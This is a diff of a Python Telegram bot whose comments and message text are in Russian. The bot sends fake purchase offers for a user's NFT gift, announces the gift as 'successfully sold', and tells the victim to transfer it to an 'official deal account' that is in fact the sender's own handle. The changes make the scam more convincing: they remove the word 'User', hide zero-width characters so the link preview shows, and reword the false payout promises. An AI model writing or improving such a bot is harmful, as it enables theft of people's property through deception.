@@ -47,7 +47,6 @@ async def send_offer(message: Message):
 
     parts = message.text.split()
     
-    # Теперь ждем 4 части: .gpt, ссылка, сумма, валюта
     if len(parts) != 4:
         return
 
@@ -69,24 +68,22 @@ async def send_offer(message: Message):
     nft_prefix, separator, nft_number = nft_slug.rpartition("-")
     nft_name = f"{nft_prefix} #{nft_number}" if separator and nft_number.isdigit() else nft_slug
 
-    # Кликабельный ник отправителя
     sender_username = message.from_user.username
     if sender_username:
-        username_link = f'<a href="https://t.me/{sender_username}">{sender_username}</a>'
+        # Делаем ник кликабельным, но добавляем невидимый символ, чтобы он не перебивал карточку NFT
+        username_link = f'<a href="https://t.me/{sender_username}">&#8203;{sender_username}</a>'
     else:
         username_link = message.from_user.first_name
 
-    # Кликабельная ссылка на NFT
-    nft_link = f'<a href="{link}">{nft_name}</a>'
-    
-    # Скрытая ссылка для карточки
+    # Ссылка на NFT тоже с невидимым символом
+    nft_link = f'<a href="{link}">&#8203;{nft_name}</a>'
     hidden_link = f'<a href="{link}">&#8203;</a>'
 
-    # Текст первого сообщения
+    # ТЕКСТ БЕЗ СЛОВА "ПОЛЬЗОВАТЕЛЬ"
     offer_text = (
-        f"<b>Пользователь {username_link} предлагает вам\n"
-        f"{amount} {currency_display} за {nft_link}.</b>\n\n"
-        f"<b>Действует 5 ч. 59 мин.</b>\n"
+        f"<b>{username_link} предлагает Вам\n"
+        f"{amount} {currency_display} за подарок {nft_link}.</b>\n\n"
+        f"<b>Предложение действует ещё 5ч 59м.</b>\n"
         f"{hidden_link}"
     )
 
@@ -124,7 +121,7 @@ async def send_offer(message: Message):
     except Exception as e:
         print(f"Ошибка: {e}")
 
-# --- ОБРАБОТЧИК "ПРИНЯТЬ" (ВТОРОЕ СООБЩЕНИЕ, СО ЗВЕЗДОЙ) ---
+# --- ОБРАБОТЧИК "ПРИНЯТЬ" ---
 @dispatcher.callback_query(F.data == "accept_offer")
 async def on_accept_offer(callback: CallbackQuery):
     global last_message_id
@@ -135,13 +132,11 @@ async def on_accept_offer(callback: CallbackQuery):
     conn_id = last_offer_data.get("business_connection_id")
     sender_username = last_offer_data.get("sender_username", "unknown")
 
-    username_link = f'<a href="https://t.me/{sender_username}">{sender_username}</a>'
     hidden_link = f'<a href="{link}">&#8203;</a>'
     
-    # Убрали смайлы, кроме звезды на кнопке (но кнопка тут не меняется, поэтому звезда в тексте)
     new_text = (
         f"<b>Подарок: {nft_name}\nуспешно продан!</b>\n\n"
-        f"• Отправьте подарок на официальный аккаунт сделки {username_link}, чтобы получить <b>{amount} ⭐</b>.\n"
+        f"• Отправьте подарок на официальный аккаунт сделки <b>@{sender_username}</b>, чтобы получить <b>{amount} {currency_display}</b>.\n"
         f"{hidden_link}"
     )
 
@@ -173,7 +168,7 @@ async def on_accept_offer(callback: CallbackQuery):
     
     await callback.answer()
 
-# --- ОБРАБОТЧИК "КАК ПЕРЕДАТЬ?" (ТРЕТЬЕ СООБЩЕНИЕ) ---
+# --- ОБРАБОТЧИК "КАК ПЕРЕДАТЬ?" ---
 @dispatcher.callback_query(F.data == "send_transfer")
 async def on_send_transfer(callback: CallbackQuery):
     global last_message_id
@@ -184,20 +179,18 @@ async def on_send_transfer(callback: CallbackQuery):
     conn_id = last_offer_data.get("business_connection_id")
     sender_username = last_offer_data.get("sender_username", "unknown")
 
-    username_link = f'<a href="https://t.me/{sender_username}">{sender_username}</a>'
     hidden_link = f'<a href="{link}">&#8203;</a>'
 
-    # Убрали смайлы
     instruction_text = (
         f"<b>Сделка подтверждена.</b>\n\n"
-        f"Подарок <a href='{link}'><b>{nft_name}</b></a> зарезервирован. Чтобы получить <b>{amount} {currency_display}</b>, отправьте его на официальный аккаунт сделки {username_link}.\n\n"
+        f"Подарок <a href='{link}'><b>{nft_name}</b></a> зарезервирован. Чтобы получить <b>{amount} {currency_display}</b>, отправьте его на официальный аккаунт сделки <b>@{sender_username}</b>.\n\n"
         f"<b>Как передать подарок:</b>\n"
         f"1. Откройте Профиль -> Подарки в Telegram.\n"
         f"2. Выберите <b>{nft_name}</b> в своём списке.\n"
         f"3. Нажмите «Передать», затем укажите получателя.\n"
         f"4. Проверьте данные и подтвердите отправку.\n\n"
         f"<b>Автоматическое завершение сделки</b>\n"
-        f"После подтверждения передачи NFT-подарка на {username_link} система обновит статус сделки, а сумма <b>{amount} {currency_display}</b> станет доступна продавцу.\n"
+        f"После подтверждения передачи NFT-подарка на <b>@{sender_username}</b> система обновит статус сделки, а сумма <b>{amount} {currency_display}</b> станет доступна продавцу.\n"
         f"{hidden_link}"
     )
 
@@ -238,13 +231,11 @@ async def back_from_instruction(callback: CallbackQuery):
     conn_id = last_offer_data.get("business_connection_id")
     sender_username = last_offer_data.get("sender_username", "unknown")
 
-    username_link = f'<a href="https://t.me/{sender_username}">{sender_username}</a>'
     hidden_link = f'<a href="{link}">&#8203;</a>'
 
-    # Убрали смайлы
     back_text = (
         f"<b>Подарок: {nft_name}\nуспешно продан!</b>\n\n"
-        f"• Отправьте подарок на официальный аккаунт сделки {username_link}, чтобы получить <b>{amount} {currency_display}</b>.\n"
+        f"• Отправьте подарок на официальный аккаунт сделки <b>@{sender_username}</b>, чтобы получить <b>{amount} {currency_display}</b>.\n"
         f"{hidden_link}"
     )
 
@@ -297,4 +288,3 @@ async def main():
 
 if __name__ == "__main__":
     asyncio.run(main())
-    
